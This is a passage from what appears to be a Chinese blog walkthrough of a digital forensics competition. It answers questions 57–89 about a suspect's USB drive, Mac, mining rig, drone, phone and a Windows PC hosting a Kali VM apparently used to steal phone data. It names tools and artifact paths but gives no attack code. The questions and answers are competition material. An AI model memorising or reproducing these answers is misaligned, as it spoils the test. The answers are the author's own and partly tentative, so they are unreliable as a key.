<p>D. App<em>is</em>won<br>首先先恢复USB的文件内容。<br><img src="/2024/11/05/%E7%BE%8E%E4%BA%9A21%E5%9B%A2%E4%BD%93/IMG_20241106-171122747.png" class=""><br>如何分析勾选的复合文件<br><img src="/2024/11/05/%E7%BE%8E%E4%BA%9A21%E5%9B%A2%E4%BD%93/IMG_20241106-171149429.png" class=""><br>之后再原始搜索里搜答案的关键词<br><img src="/2024/11/05/%E7%BE%8E%E4%BA%9A21%E5%9B%A2%E4%BD%93/IMG_20241106-171235868.png" class=""><br><img src="/2024/11/05/%E7%BE%8E%E4%BA%9A21%E5%9B%A2%E4%BD%93/IMG_20241106-171302968.png" class=""><br>cpisthegoat</p>
<h3 id="57-填空题-在常威U-盘内有多少磁盘分隔区-请以阿拉伯数字回答-2分"><a href="#57-填空题-在常威U-盘内有多少磁盘分隔区-请以阿拉伯数字回答-2分" class="headerlink" title="57. [填空题] 在常威U 盘内有多少磁盘分隔区 ? (请以阿拉伯数字回答) (2分)"></a>57. [填空题] 在常威U 盘内有多少磁盘分隔区 ? (请以阿拉伯数字回答) (2分)</h3><p>将镜像放到x-ways里<br><img src="/2024/11/05/%E7%BE%8E%E4%BA%9A21%E5%9B%A2%E4%BD%93/IMG_20241106-171536898.png" class=""><br>4</p>
<h3 id="58-填空题-在常威U-盘内有多少份excel-文件-请以阿拉伯数字回答-1分"><a href="#58-填空题-在常威U-盘内有多少份excel-文件-请以阿拉伯数字回答-1分" class="headerlink" title="58. [填空题] 在常威U 盘内有多少份excel 文件 ? (请以阿拉伯数字回答) (1分)"></a>58. [填空题] 在常威U 盘内有多少份excel 文件 ? (请以阿拉伯数字回答) (1分)</h3><img src="/2024/11/05/%E7%BE%8E%E4%BA%9A21%E5%9B%A2%E4%BD%93/IMG_20241106-170214430.png" class="">  
<p>3份</p>
<h3 id="59-填空题-在常威U-盘内-内含有多少个客户数据-请以阿拉伯数字回答-1分"><a href="#59-填空题-在常威U-盘内-内含有多少个客户数据-请以阿拉伯数字回答-1分" class="headerlink" title="59. [填空题] 在常威U 盘内, 内含有多少个客户数据 ? (请以阿拉伯数字回答) (1分)"></a>59. [填空题] 在常威U 盘内, 内含有多少个客户数据 ? (请以阿拉伯数字回答) (1分)</h3><img src="/2024/11/05/%E7%BE%8E%E4%BA%9A21%E5%9B%A2%E4%BD%93/IMG_20241106-171808362.png" class="">  
<p>50</p>
<h3 id="60-多选题-以下哪个客户数据储存在常威U盘内-？-3分"><a href="#60-多选题-以下哪个客户数据储存在常威U盘内-？-3分" class="headerlink" title="60. [多选题] 以下哪个客户数据储存在常威U盘内 ？ (3分)"></a>60. [多选题] 以下哪个客户数据储存在常威U盘内 ？ (3分)</h3><p>A. jmuat1@reference.com</p>
<p>B. cgeraudg@forbes.com</p>
<p>C. cwarmishamo@admin.ch</p>
<p>D. abddfdf@google.com</p>
<p>E. alex1234@apple.com</p>
<img src="/2024/11/05/%E7%BE%8E%E4%BA%9A21%E5%9B%A2%E4%BD%93/IMG_20241106-172247491.png" class="">  
<img src="/2024/11/05/%E7%BE%8E%E4%BA%9A21%E5%9B%A2%E4%BD%93/IMG_20241106-172307318.png" class="">  
<img src="/2024/11/05/%E7%BE%8E%E4%BA%9A21%E5%9B%A2%E4%BD%93/IMG_20241106-172320851.png" class="">  
<p>ABC</p>
<h2 id="MAC计算机"><a href="#MAC计算机" class="headerlink" title="MAC计算机"></a>MAC计算机</h2><h3 id="61-单选题-常威MAC计算机上一个系统版本是甚么及现正运行哪一个版本的系统-3分"><a href="#61-单选题-常威MAC计算机上一个系统版本是甚么及现正运行哪一个版本的系统-3分" class="headerlink" title="61. [单选题] 常威MAC计算机上一个系统版本是甚么及现正运行哪一个版本的系统? (3分)"></a>61. [单选题] 常威MAC计算机上一个系统版本是甚么及现正运行哪一个版本的系统? (3分)</h3><p>A. MacOS 10.11.6 and MacOS 11.6</p>
<p>B. MacOS 10.11.5 and MacOS 11.5</p>
<p>C. MacOS 10.11.4 and MacOS 11.6</p>
<p>D. 以上皆非<br><img src="/2024/11/05/%E7%BE%8E%E4%BA%9A21%E5%9B%A2%E4%BD%93/IMG_20241106-172527425.png" class=""><br>脱到取证大师里，发现内容非常的少，猜测是有分区被加密了，结合上面再usb里取到的密码我们来进行解密<br>如何再继续取证<br><img src="/2024/11/05/%E7%BE%8E%E4%BA%9A21%E5%9B%A2%E4%BD%93/IMG_20241106-173506243.png" class=""><br>当前版本为11.6<br>再在文件里搜索version可以搜索到<br><img src="/2024/11/05/%E7%BE%8E%E4%BA%9A21%E5%9B%A2%E4%BD%93/IMG_20241106-173543771.png" class=""><br><img src="/2024/11/05/%E7%BE%8E%E4%BA%9A21%E5%9B%A2%E4%BD%93/IMG_20241106-173439549.png" class=""><br>系统版本信息： Preboot\root\4A14282D-8DC8-3473-BB07-F12364604073\System\Library\CoreServices\systemVersion.plist</p>
<p>历史版本信息：分区1[apfsb0]\Chris - Data\root\private\var\db\PreviousSystemVersion.plist</p>
<p>应用历史安装记录：分区1[apfsb0]:\Chris - Data:\root\Library\Receipts\InstallHistory.plist</p>
<h3 id="62-多选题-常威MAC计算机的系统事件纪录内哪个卷标-Flag-是关于储存档案于计算机-3分"><a href="#62-多选题-常威MAC计算机的系统事件纪录内哪个卷标-Flag-是关于储存档案于计算机-3分" class="headerlink" title="62. [多选题] 常威MAC计算机的系统事件纪录内哪个卷标(Flag)是关于储存档案于计算机? (3分)"></a>62. [多选题] 常威MAC计算机的系统事件纪录内哪个卷标(Flag)是关于储存档案于计算机? (3分)</h3><p>A. Created</p>
<p>B. InodeMetaMod</p>
<p>C. FinderInfoChanged</p>
<p>D. IsDirectory</p>
<p>E. OwnerChanged<br>ABCE好像是理论知识。</p>
<h3 id="63-多选题-常威MAC计算机曾连接哪一个无线网络SSID-2分"><a href="#63-多选题-常威MAC计算机曾连接哪一个无线网络SSID-2分" class="headerlink" title="63. [多选题] 常威MAC计算机曾连接哪一个无线网络SSID? (2分)"></a>63. [多选题] 常威MAC计算机曾连接哪一个无线网络SSID? (2分)</h3><p>A. wai wifi</p>
<p>B. wanchainew1</p>
<p>C. central2</p>
<p>D. Hongkong1<br><img src="/2024/11/05/%E7%BE%8E%E4%BA%9A21%E5%9B%A2%E4%BD%93/IMG_20241106-174104952.png" class=""><br>网络信息里看不到wifi的具体名字。要去密码/密码检索里找<br>AB</p>
<h3 id="64-单选题-常威MAC计算机的使用者甚么时候将”隔空投送”-airdrop-转换至任何人模式-2分"><a href="#64-单选题-常威MAC计算机的使用者甚么时候将”隔空投送”-airdrop-转换至任何人模式-2分" class="headerlink" title="64. [单选题] 常威MAC计算机的使用者甚么时候将”隔空投送”(airdrop)转换至任何人模式? (2分)"></a>64. [单选题] 常威MAC计算机的使用者甚么时候将”隔空投送”(airdrop)转换至任何人模式? (2分)</h3><p>A. 2021-10-21 16:52:48 (UTC +8)</p>
<p>B. 2021-10-21 18:52:48 (UTC +8)</p>
<p>C. 2021-10-21 06:52:48 (UTC +8)</p>
<p>D. 2021-10-21 08:52:48 (UTC +8)</p>
<h3 id="65-填空题-常威MAC计算机的APFS储存容器的文件签名是-，偏移值为-例如NTFS及64，请输入-NTFS64-。-2分"><a href="#65-填空题-常威MAC计算机的APFS储存容器的文件签名是-，偏移值为-例如NTFS及64，请输入-NTFS64-。-2分" class="headerlink" title="65. [填空题] 常威MAC计算机的APFS储存容器的文件签名是__，偏移值为__(例如NTFS及64，请输入 NTFS64)。 (2分)"></a>65. [填空题] 常威MAC计算机的APFS储存容器的文件签名是<strong><em>__</em></strong>，偏移值为<strong>__</strong>(例如NTFS及64，请输入 NTFS64)。 (2分)</h3><img src="/2024/11/05/%E7%BE%8E%E4%BA%9A21%E5%9B%A2%E4%BD%93/IMG_20241106-175557650.png" class="">  
<p>第一行的开头为偏移量第二含的开头为签名即NXSB和32 F不用管</p>
<h3 id="66-单选题-常威MAC计算机的镜像档案内，总共有多少个系统默认的卷标-1分"><a href="#66-单选题-常威MAC计算机的镜像档案内，总共有多少个系统默认的卷标-1分" class="headerlink" title="66. [单选题] 常威MAC计算机的镜像档案内，总共有多少个系统默认的卷标? (1分)"></a>66. [单选题] 常威MAC计算机的镜像档案内，总共有多少个系统默认的卷标? (1分)</h3><p>A. 4</p>
<p>B. 5</p>
<p>C. 6</p>
<p>D. 7</p>
<p>选 B<br><img src="/2024/11/05/%E7%BE%8E%E4%BA%9A21%E5%9B%A2%E4%BD%93/IMG_20241106-180601177.png" class="">  </p>
<img src="/2024/11/05/%E7%BE%8E%E4%BA%9A21%E5%9B%A2%E4%BD%93/IMG_20241106-180508725.png" class="">  
<img src="/2024/11/05/%E7%BE%8E%E4%BA%9A21%E5%9B%A2%E4%BD%93/IMG_20241106-180454060.png" class="">  
<h3 id="67-填空题-常威MAC计算机的使用者上一次关闭浏览器时，正在浏览多少个网页-请以阿拉伯数字回答-3分"><a href="#67-填空题-常威MAC计算机的使用者上一次关闭浏览器时，正在浏览多少个网页-请以阿拉伯数字回答-3分" class="headerlink" title="67. [填空题] 常威MAC计算机的使用者上一次关闭浏览器时，正在浏览多少个网页? (请以阿拉伯数字回答) (3分)"></a>67. [填空题] 常威MAC计算机的使用者上一次关闭浏览器时，正在浏览多少个网页? (请以阿拉伯数字回答) (3分)</h3><p>10<br><img src="/2024/11/05/%E7%BE%8E%E4%BA%9A21%E5%9B%A2%E4%BD%93/IMG_20241106-180651788.png" class="">  </p>
<h3 id="68-多选题-常威MAC计算机中以下哪个档案并不是iPhone所拍摄的图片-2分"><a href="#68-多选题-常威MAC计算机中以下哪个档案并不是iPhone所拍摄的图片-2分" class="headerlink" title="68. [多选题] 常威MAC计算机中以下哪个档案并不是iPhone所拍摄的图片? (2分)"></a>68. [多选题] 常威MAC计算机中以下哪个档案并不是iPhone所拍摄的图片? (2分)</h3><p>A. IMG_0002</p>
<p>B. IMG_0003</p>
<p>C. IMG_0004</p>
<p>D. IMG_0005</p>
<p>E. IMG_0006<br><img src="/2024/11/05/%E7%BE%8E%E4%BA%9A21%E5%9B%A2%E4%BD%93/IMG_20241106-180824960.png" class=""><br><img src="/2024/11/05/%E7%BE%8E%E4%BA%9A21%E5%9B%A2%E4%BD%93/IMG_20241106-180842557.png" class=""><br><img src="/2024/11/05/%E7%BE%8E%E4%BA%9A21%E5%9B%A2%E4%BD%93/IMG_20241106-181025772.png" class="">  </p>
<p>AD搜索不到</p>
<h2 id="矿机"><a href="#矿机" class="headerlink" title="矿机"></a>矿机</h2><h3 id="69-多选题-在常威的矿机没有进行哪种加密货币掘矿-2分"><a href="#69-多选题-在常威的矿机没有进行哪种加密货币掘矿-2分" class="headerlink" title="69. [多选题] 在常威的矿机没有进行哪种加密货币掘矿 ? (2分)"></a>69. [多选题] 在常威的矿机没有进行哪种加密货币掘矿 ? (2分)</h3><p>A. Bitcoin</p>
<p>B. Ethereum</p>
<p>C. RVN</p>
<p>D. Dodge</p>
<p>E. ENJ<br><img src="/2024/11/05/%E7%BE%8E%E4%BA%9A21%E5%9B%A2%E4%BD%93/IMG_20241106-184823554.png" class=""><br>只能搜到A<br><img src="/2024/11/05/%E7%BE%8E%E4%BA%9A21%E5%9B%A2%E4%BD%93/IMG_20241106-190251099.png" class=""><br><img src="/2024/11/05/%E7%BE%8E%E4%BA%9A21%E5%9B%A2%E4%BD%93/IMG_20241106-190304151.png" class=""><br>搜一下可以搜到<br>PhoenixMiner<br><img src="/2024/11/05/%E7%BE%8E%E4%BA%9A21%E5%9B%A2%E4%BD%93/IMG_20241106-190344581.png" class=""><br><img src="/2024/11/05/%E7%BE%8E%E4%BA%9A21%E5%9B%A2%E4%BD%93/IMG_20241106-190810741.png" class=""><br>在log文件夹下找到log。<br><img src="/2024/11/05/%E7%BE%8E%E4%BA%9A21%E5%9B%A2%E4%BD%93/IMG_20241106-191611531.png" class=""><br>可以发现是以太坊</p>
<h3 id="70-填空题-在常威矿机有几张显示适配器进行掘矿-请以阿拉伯数字回答-1分"><a href="#70-填空题-在常威矿机有几张显示适配器进行掘矿-请以阿拉伯数字回答-1分" class="headerlink" title="70. [填空题] 在常威矿机有几张显示适配器进行掘矿 ? (请以阿拉伯数字回答) (1分)"></a>70. [填空题] 在常威矿机有几张显示适配器进行掘矿 ? (请以阿拉伯数字回答) (1分)</h3><img src="/2024/11/05/%E7%BE%8E%E4%BA%9A21%E5%9B%A2%E4%BD%93/IMG_20241106-191710650.png" class="">  
<p>只能找到GPU1和GPU2<br>两张</p>
<h3 id="71-单选题-在常威矿机-hive-OS-操作系统是什么版本-1分"><a href="#71-单选题-在常威矿机-hive-OS-操作系统是什么版本-1分" class="headerlink" title="71. [单选题] 在常威矿机, hive OS 操作系统是什么版本 ? (1分)"></a>71. [单选题] 在常威矿机, hive OS 操作系统是什么版本 ? (1分)</h3><p>A. 5.4.0 <strong>*</strong></p>
<p>B. 6.0.1 <strong>*</strong></p>
<p>C. 7.0.2 <strong>*</strong></p>
<p>D. 10.0.2<strong>*</strong></p>
<p>E. 15.1.2<strong>*</strong><br><img src="/2024/11/05/%E7%BE%8E%E4%BA%9A21%E5%9B%A2%E4%BD%93/IMG_20241106-184412231.png" class=""><br>直接uname -a看其内核信息<br>选A</p>
<h3 id="72-多选题-在常威矿机中-哪个不是收取掘矿收益的加密货币钱包地址-1分"><a href="#72-多选题-在常威矿机中-哪个不是收取掘矿收益的加密货币钱包地址-1分" class="headerlink" title="72. [多选题] 在常威矿机中, 哪个不是收取掘矿收益的加密货币钱包地址 ? (1分)"></a>72. [多选题] 在常威矿机中, 哪个不是收取掘矿收益的加密货币钱包地址 ? (1分)</h3><p>A. <code>0xE365625f4**537151304ceba7C7D9dF0C7E829**</code></p>
<p>B. <code>0xe68de863f4c3c3cc0**191b9cefdae91b3e6fbd8**</code></p>
<p>C. <code>0x00000000897**f4136b4a59731680a88f895303**</code></p>
<p>D. <code>0x7335c**20f9533d9cc825e2a6e80821fd44e27f8**</code></p>
<p>E. <code>0x00**000089705f4136b4a59731680a88f895303**</code><br><img src="/2024/11/05/%E7%BE%8E%E4%BA%9A21%E5%9B%A2%E4%BD%93/IMG_20241106-192203181.png" class=""><br>搜索wallet可以找到钱包配置发现只有A<br>BCDE</p>
<h3 id="73-单选题-在常威矿机中-用于掘矿登入密码是什么-2分"><a href="#73-单选题-在常威矿机中-用于掘矿登入密码是什么-2分" class="headerlink" title="73. [单选题] 在常威矿机中, 用于掘矿登入密码是什么 ? (2分)"></a>73. [单选题] 在常威矿机中, 用于掘矿登入密码是什么 ? (2分)</h3><p>A. eg97em**wm</p>
<p>B. Deg97em**wm</p>
<p>C. feg97em**wm</p>
<p>D. eeg97em**wm</p>
<p>E. heg97em**wm<br><img src="/2024/11/05/%E7%BE%8E%E4%BA%9A21%E5%9B%A2%E4%BD%93/IMG_20241106-192332911.png" class=""><br><img src="/2024/11/05/%E7%BE%8E%E4%BA%9A21%E5%9B%A2%E4%BD%93/IMG_20241106-192634251.png" class=""><br>也可以在rig.conf里找到</p>
<h3 id="74-填空题-在常威矿机中-用于掘矿Nvidia显示适配器所使用的驱动程式使用什么版本-请以英文全大写及阿拉伯数字回答-1分"><a href="#74-填空题-在常威矿机中-用于掘矿Nvidia显示适配器所使用的驱动程式使用什么版本-请以英文全大写及阿拉伯数字回答-1分" class="headerlink" title="74. [填空题] 在常威矿机中,用于掘矿Nvidia显示适配器所使用的驱动程式使用什么版本?(请以英文全大写及阿拉伯数字回答) (1分)"></a>74. [填空题] 在常威矿机中,用于掘矿Nvidia显示适配器所使用的驱动程式使用什么版本?(请以英文全大写及阿拉伯数字回答) (1分)</h3><img src="/2024/11/05/%E7%BE%8E%E4%BA%9A21%E5%9B%A2%E4%BD%93/IMG_20241106-192800745.png" class="">  
<p>PhoenixMiner日志里可以找到</p>
<h3 id="75-多选题-在常威矿机中-用于掘矿显示适配器型号包括什么-2分"><a href="#75-多选题-在常威矿机中-用于掘矿显示适配器型号包括什么-2分" class="headerlink" title="75. [多选题] 在常威矿机中, 用于掘矿显示适配器型号包括什么? (2分)"></a>75. [多选题] 在常威矿机中, 用于掘矿显示适配器型号包括什么? (2分)</h3><p>A. GeForce RTX 3060</p>
<p>B. Quadro P2000</p>
<p>C. RX 6600</p>
<p>D. GeForce GTX 1660 Ti</p>
<p>E. GeForce GTX 3070<br><img src="/2024/11/05/%E7%BE%8E%E4%BA%9A21%E5%9B%A2%E4%BD%93/IMG_20241106-192916539.png" class=""><br>A,B</p>
<h3 id="76-多选题-在常威矿机-哪一天没有进行掘矿-2分"><a href="#76-多选题-在常威矿机-哪一天没有进行掘矿-2分" class="headerlink" title="76. [多选题] 在常威矿机, 哪一天没有进行掘矿? (2分)"></a>76. [多选题] 在常威矿机, 哪一天没有进行掘矿? (2分)</h3><p>A. 2021-10-06</p>
<p>B. 2021-10-09</p>
<p>C. 2021-10-15</p>
<p>D. 2021-10-17</p>
<p>E. 2021-10-18<br><img src="/2024/11/05/%E7%BE%8E%E4%BA%9A21%E5%9B%A2%E4%BD%93/IMG_20241106-193040954.png" class=""><br><img src="/2024/11/05/%E7%BE%8E%E4%BA%9A21%E5%9B%A2%E4%BD%93/IMG_20241106-193054629.png" class=""><br><img src="/2024/11/05/%E7%BE%8E%E4%BA%9A21%E5%9B%A2%E4%BD%93/IMG_20241106-193112699.png" class=""><br><img src="/2024/11/05/%E7%BE%8E%E4%BA%9A21%E5%9B%A2%E4%BD%93/IMG_20241106-193146698.png" class=""><br>BCDE日志里只有6号的</p>
<h2 id="无人机"><a href="#无人机" class="headerlink" title="无人机"></a>无人机</h2><h3 id="77-填空题-常威的无人机中的飞航纪录-DAT可见到于2021年10月11日1505时的GPS地点。-请以英文全大写及阿拉伯数字回答-1分"><a href="#77-填空题-常威的无人机中的飞航纪录-DAT可见到于2021年10月11日1505时的GPS地点。-请以英文全大写及阿拉伯数字回答-1分" class="headerlink" title="77. [填空题] 常威的无人机中的飞航纪录_.DAT可见到于2021年10月11日1505时的GPS地点。(请以英文全大写及阿拉伯数字回答) (1分)"></a>77. [填空题] 常威的无人机中的飞航纪录<strong><strong>_</strong></strong>.DAT可见到于2021年10月11日1505时的GPS地点。(请以英文全大写及阿拉伯数字回答) (1分)</h3><img src="/2024/11/05/%E7%BE%8E%E4%BA%9A21%E5%9B%A2%E4%BD%93/IMG_20241106-194507665.png" class="">  
<p>在手机的位置里可以找到为FLY093</p>
<h3 id="78-单选题-常威的无人机于2021年10月11日15-07-51时之间所在的地点是什么-1分"><a href="#78-单选题-常威的无人机于2021年10月11日15-07-51时之间所在的地点是什么-1分" class="headerlink" title="78. [单选题] 常威的无人机于2021年10月11日15:07:51时之间所在的地点是什么? (1分)"></a>78. [单选题] 常威的无人机于2021年10月11日15:07:51时之间所在的地点是什么? (1分)</h3><p>A. 22.269299, 114.200486</p>
<p>B. 22.269353, 114.287267</p>
<p>C. 22.346855, 114.289552</p>
<p>D. 22.269293, 114.201278<br><img src="/2024/11/05/%E7%BE%8E%E4%BA%9A21%E5%9B%A2%E4%BD%93/IMG_20241106-194645524.png" class=""><br>D与其最接近</p>
<h3 id="79-填空题-常威的无人机哪一个档案有最后降落时间的数据-请以英文全大写及阿拉伯数字回答-不用输入”-”-？-1分"><a href="#79-填空题-常威的无人机哪一个档案有最后降落时间的数据-请以英文全大写及阿拉伯数字回答-不用输入”-”-？-1分" class="headerlink" title="79. [填空题] 常威的无人机哪一个档案有最后降落时间的数据(请以英文全大写及阿拉伯数字回答,不用输入”.”)？ (1分)"></a>79. [填空题] 常威的无人机哪一个档案有最后降落时间的数据(请以英文全大写及阿拉伯数字回答,不用输入”.”)？ (1分)</h3><img src="/2024/11/05/%E7%BE%8E%E4%BA%9A21%E5%9B%A2%E4%BD%93/IMG_20241106-195424620.png" class="">  
<p>一样 FLY096</p>
<h2 id="手机-2"><a href="#手机-2" class="headerlink" title="手机"></a>手机</h2><h3 id="80-多选题-常威的手机中哪一个是由常威的无人机于2021年10月11日所拍摄的图像文件-2分"><a href="#80-多选题-常威的手机中哪一个是由常威的无人机于2021年10月11日所拍摄的图像文件-2分" class="headerlink" title="80. [多选题] 常威的手机中哪一个是由常威的无人机于2021年10月11日所拍摄的图像文件? (2分)"></a>80. [多选题] 常威的手机中哪一个是由常威的无人机于2021年10月11日所拍摄的图像文件? (2分)</h3><p>A. Containers 货柜</p>
<p>B. Buildings 大厦</p>
<p>C. bicycle 单车</p>
<p>D. Mountain 山<br>通过位置的文件定位到无人机的文件下，可以找到照片<br><img src="/2024/11/05/%E7%BE%8E%E4%BA%9A21%E5%9B%A2%E4%BD%93/IMG_20241106-201132133.png" class=""><br><img src="/2024/11/05/%E7%BE%8E%E4%BA%9A21%E5%9B%A2%E4%BD%93/IMG_20241106-201258971.png" class="">  </p>
<p>有山，有大厦，有货柜</p>
<h3 id="81-填空题-常威的手机中显示常威的无人机DJI-GO-4的版本是4-3-请以阿拉伯数字回答-1分"><a href="#81-填空题-常威的手机中显示常威的无人机DJI-GO-4的版本是4-3-请以阿拉伯数字回答-1分" class="headerlink" title="81. [填空题] 常威的手机中显示常威的无人机DJI GO 4的版本是4.3._?(请以阿拉伯数字回答) (1分)"></a>81. [填空题] 常威的手机中显示常威的无人机DJI GO 4的版本是4.3.<em>_</em>?(请以阿拉伯数字回答) (1分)</h3><img src="/2024/11/05/%E7%BE%8E%E4%BA%9A21%E5%9B%A2%E4%BD%93/IMG_20241106-202110826.png" class="">  
<h3 id="82-多选题-常威的手机中所安装的DJI-GO-4-软件中，以下哪个database没有显示临时禁飞区-2分"><a href="#82-多选题-常威的手机中所安装的DJI-GO-4-软件中，以下哪个database没有显示临时禁飞区-2分" class="headerlink" title="82. [多选题] 常威的手机中所安装的DJI GO 4 软件中，以下哪个database没有显示临时禁飞区? (2分)"></a>82. [多选题] 常威的手机中所安装的DJI GO 4 软件中，以下哪个database没有显示临时禁飞区? (2分)</h3><p>A. Filesflysafe_app.db</p>
<p>B. Special_warning.db</p>
<p>C. Flysafe_app_dynamic_areas.db</p>
<p>D. Flysafe_polygon_1860.db<br><img src="/2024/11/05/%E7%BE%8E%E4%BA%9A21%E5%9B%A2%E4%BD%93/IMG_20241106-202558938.png" class="">  </p>
<p>ABD一个个看过去只要C有显示</p>
<h3 id="83-填空题-常威的手机中在-db可知道DJI-GO-4-的登入电子邮件-请以英文全大写及阿拉伯数字回答-1分"><a href="#83-填空题-常威的手机中在-db可知道DJI-GO-4-的登入电子邮件-请以英文全大写及阿拉伯数字回答-1分" class="headerlink" title="83. [填空题] 常威的手机中在__.db可知道DJI GO 4 的登入电子邮件(请以英文全大写及阿拉伯数字回答) (1分)"></a>83. [填空题] 常威的手机中在<strong><strong>__</strong></strong>.db可知道DJI GO 4 的登入电子邮件(请以英文全大写及阿拉伯数字回答) (1分)</h3><img src="/2024/11/05/%E7%BE%8E%E4%BA%9A21%E5%9B%A2%E4%BD%93/IMG_20241106-203433462.png" class="">  
<p>把源文件的两个路径都看一下<br><img src="/2024/11/05/%E7%BE%8E%E4%BA%9A21%E5%9B%A2%E4%BD%93/IMG_20241106-203738711.png" class=""><br>最终在localappstate</p>
<h3 id="84-填空题-常威的手机中在-db包含了名为server-timestamp-的资料-请以英文全大写及阿拉伯数字回答-1分"><a href="#84-填空题-常威的手机中在-db包含了名为server-timestamp-的资料-请以英文全大写及阿拉伯数字回答-1分" class="headerlink" title="84. [填空题] 常威的手机中在__.db包含了名为server_timestamp 的资料(请以英文全大写及阿拉伯数字回答) (1分)"></a>84. [填空题] 常威的手机中在<strong><strong>__</strong></strong>.db包含了名为server_timestamp 的资料(请以英文全大写及阿拉伯数字回答) (1分)</h3><p>flysafe_app_dynamic_areas.db<br><img src="/2024/11/05/%E7%BE%8E%E4%BA%9A21%E5%9B%A2%E4%BD%93/IMG_20241106-202834627.png" class="">  </p>
<h2 id="windows计算机"><a href="#windows计算机" class="headerlink" title="windows计算机"></a>windows计算机</h2><h3 id="85-单选题-常威利用Windows-计算机中的VM-Kali进行攻击和收取受害人电话的数据，请找出常威的VM存放地址-2分"><a href="#85-单选题-常威利用Windows-计算机中的VM-Kali进行攻击和收取受害人电话的数据，请找出常威的VM存放地址-2分" class="headerlink" title="85. [单选题] 常威利用Windows 计算机中的VM Kali进行攻击和收取受害人电话的数据，请找出常威的VM存放地址 (2分)"></a>85. [单选题] 常威利用Windows 计算机中的VM Kali进行攻击和收取受害人电话的数据，请找出常威的VM存放地址 (2分)</h3><p>A. Users\Chris Paul\Desktop\安全防护 Malware\Kali-Linux-2020.2a-amd64_2.vmwarevm</p>
<p>B. \Users\Chris Paul\Desktop\安全防护 Malware Demo\Kali-Linux-2020.2a-amd64_2.vmwarevm</p>
<p>C. \Users\Chris Paul\Documents\安全防护 Malware \Kali-Linux-2020.2a-amd64_2.vmwarevm</p>
<p>D. \Users\Chris Paul\Documents\Virtual Machines<br><img src="/2024/11/05/%E7%BE%8E%E4%BA%9A21%E5%9B%A2%E4%BD%93/IMG_20241106-210732421.png" class=""><br><img src="/2024/11/05/%E7%BE%8E%E4%BA%9A21%E5%9B%A2%E4%BD%93/IMG_20241106-210752647.png" class=""><br>A</p>
<h3 id="86-单选题-常威在收集数据后储存数据于Windows-计算机一个名为”text2-txt”的档案中，随后他将档案移往”-home-kali-Desktop-project-”中-下述哪个档案可以证明这一点-i-root-bash-history-ii-home-kali-bash-history-3分"><a href="#86-单选题-常威在收集数据后储存数据于Windows-计算机一个名为”text2-txt”的档案中，随后他将档案移往”-home-kali-Desktop-project-”中-下述哪个档案可以证明这一点-i-root-bash-history-ii-home-kali-bash-history-3分" class="headerlink" title="86. [单选题] 常威在收集数据后储存数据于Windows 计算机一个名为”text2.txt”的档案中，随后他将档案移往”\home\kali\Desktop\project\”中, 下述哪个档案可以证明这一点? i) \root.bash_history ii) \home\kali.bash_history (3分)"></a>86. [单选题] 常威在收集数据后储存数据于Windows 计算机一个名为”text2.txt”的档案中，随后他将档案移往”\home\kali\Desktop\project\”中, 下述哪个档案可以证明这一点? i) \root.bash_history ii) \home\kali.bash_history (3分)</h3><p>A. 只有 i</p>
<p>B. 只有ii</p>
<p>C. 两个也可以</p>
<p>D. 两个也不可以<br>找到虚拟机的vmdk文件，随便右击一个，虚拟硬盘解析即可得到kali的取证文件<br><img src="/2024/11/05/%E7%BE%8E%E4%BA%9A21%E5%9B%A2%E4%BD%93/IMG_20241106-221051590.png" class="">  </p>
<img src="/2024/11/05/%E7%BE%8E%E4%BA%9A21%E5%9B%A2%E4%BD%93/IMG_20241106-215441614.png" class="">  
<p>首先上面的两个都是liunx的bash命令历史，而如果windows将文件复制到虚拟机里并不会产生bash命令。<br>查看命令记录会发现，虽然出现test2.txt但是其操作为将命令执行的结果写入其中<br>D</p>
<h3 id="87-单选题-常威Windows计算机中哪一个程式-档案有可能用作收取受害人电话上的数据-3分"><a href="#87-单选题-常威Windows计算机中哪一个程式-档案有可能用作收取受害人电话上的数据-3分" class="headerlink" title="87. [单选题] 常威Windows计算机中哪一个程式/档案有可能用作收取受害人电话上的数据? (3分)"></a>87. [单选题] 常威Windows计算机中哪一个程式/档案有可能用作收取受害人电话上的数据? (3分)</h3><p>A. \home\kali\Desktop\server_express_ok.js</p>
<p>B. \home\kali\Desktop\baddish\package.json</p>
<p>C. \home\kali\Desktop\baddish\server.js</p>
<p>D. \home\kali\Desktop\server.js<br>从历史命令可以看出来其将server.js复制到\home\kali\Desktop\baddish然后执行将执行结果输入到test.txt<br><img src="/2024/11/05/%E7%BE%8E%E4%BA%9A21%E5%9B%A2%E4%BD%93/IMG_20241106-215441614.png" class="">  </p>
<p>A</p>
<h3 id="88-多选题-常威Windows计算机中显示常威第一次偷取受害人电话数据有机会是在哪一个日子及时间登入-Kali-系统-2分"><a href="#88-多选题-常威Windows计算机中显示常威第一次偷取受害人电话数据有机会是在哪一个日子及时间登入-Kali-系统-2分" class="headerlink" title="88. [多选题] 常威Windows计算机中显示常威第一次偷取受害人电话数据有机会是在哪一个日子及时间登入 Kali 系统? (2分)"></a>88. [多选题] 常威Windows计算机中显示常威第一次偷取受害人电话数据有机会是在哪一个日子及时间登入 Kali 系统? (2分)</h3><p>A. 2021-09-27</p>
<p>B. 2021-09-29</p>
<p>C. 2021-09-29</p>
<p>D. 11:42:47</p>
<p>E. 16:04:24</p>
<p>F. 16:30:04<br><img src="/2024/11/05/%E7%BE%8E%E4%BA%9A21%E5%9B%A2%E4%BD%93/IMG_20241106-222100987.png" class=""><br>在win10时间轴里可以看到打开虚拟机的时间，而只有24和27号有打开虚拟机，即时间为27号而打开虚拟机的时间段内的只有16.30即选AF</p>
<h3 id="89-多选题-常威Windows计算机中以下哪一个檔案的哈希值-MD5-能证明常威曾开启存有客户数据的档案-2分"><a href="#89-多选题-常威Windows计算机中以下哪一个檔案的哈希值-MD5-能证明常威曾开启存有客户数据的档案-2分" class="headerlink" title="89. [多选题] 常威Windows计算机中以下哪一个檔案的哈希值(MD5)能证明常威曾开启存有客户数据的档案? (2分)"></a>89. [多选题] 常威Windows计算机中以下哪一个檔案的哈希值(MD5)能证明常威曾开启存有客户数据的档案? (2分)</h3><p>A. 0ED1DB00F8598AD3C6B331BF0C477AD4</p>
<p>B. 1E1BDB083F66251A63B79DEA3801E6E9</p>
<p>C. 575326396E31040FE2E13BE42C55C3E2</p>
<p>D. 3128604B4A9EC1D37418942555F6B08A</p>
